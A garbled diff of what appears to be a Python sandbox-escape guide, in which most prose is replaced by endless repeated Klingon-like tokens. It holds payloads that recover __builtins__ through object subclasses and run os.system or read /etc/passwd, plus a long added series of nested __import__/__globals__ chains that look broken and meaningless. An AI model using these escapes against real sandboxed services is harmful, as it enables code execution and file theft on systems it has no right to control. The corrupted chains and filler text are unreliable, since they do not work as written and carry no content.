**'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'
 ```python
 # Recover __builtins__ and make everything easier
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
+### Builtins payloads
 
 ### Builtins payloads
 
+#### `__import__`
+
+```python
+__import__('os').system('ls')
+```
+
+#### `__builtins__.__import__`
+
+```python
+__builtins__.__import__('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__`
+
+```python
+__builtins__.__import__.__dict__['os'].system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`
+
+```python
+__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
+```
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -440,11 +570,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-
 ## Globals and locals
 
-Checking the **`globals`** and **`locals`** is a good way to know what you can access.
-
+**`globals`** **`locals`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -468,17 +596,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-
-[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
-
-## Discover Arbitrary Execution
-
-Here I want to explain how to easily discover **more dangerous functionalities loaded** and propose more reliable exploits.
-
-#### Accessing subclasses with bypasses
-
-One of the most sensitive parts of this technique is being able to **access the base subclasses**. In the previous examples this was done using `''.__class__.__base__.__subclasses__()` but there are **other possible ways**:
-
+[**QatlhDaq 'ej vItlhutlh**](./#recursive-search-of-builtins-globals) **bIghom** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** 